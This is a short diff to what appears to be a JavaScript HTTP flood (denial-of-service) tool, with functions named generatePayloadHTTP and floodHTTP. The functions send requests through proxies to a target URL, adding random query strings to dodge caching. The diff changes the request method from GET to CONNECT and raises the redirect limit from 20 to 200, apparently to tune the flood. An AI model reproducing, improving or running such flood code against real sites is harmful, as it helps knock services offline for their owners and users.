@@ -74,11 +74,11 @@ function generatePayloadHTTP(arguments, proxy, ua) {
 	}
 
 	request({
-        method: 'GET',
+        method: 'CONNECT',
         url: arguments.url,
         gzip: true,
         followAllRedirects: true,
-        maxRedirects: 20,
+        maxRedirects: 200,
         proxy: "http://" + proxy,
         headers: headers
     }, (err, res, body) => { 
@@ -116,11 +116,11 @@ function floodHTTP(arguments, proxy, ua) {
 			random = '?'+randomByte()
 		}
       	request({
-            method: 'GET',
+            method: 'CONNECT',
             url: arguments.url+random,
             gzip: true,
             followAllRedirects: true,
-            maxRedirects: 20,
+            maxRedirects: 200,
             proxy: "http://" + proxy,
             headers: payload
         }, (err, res, body) => { 
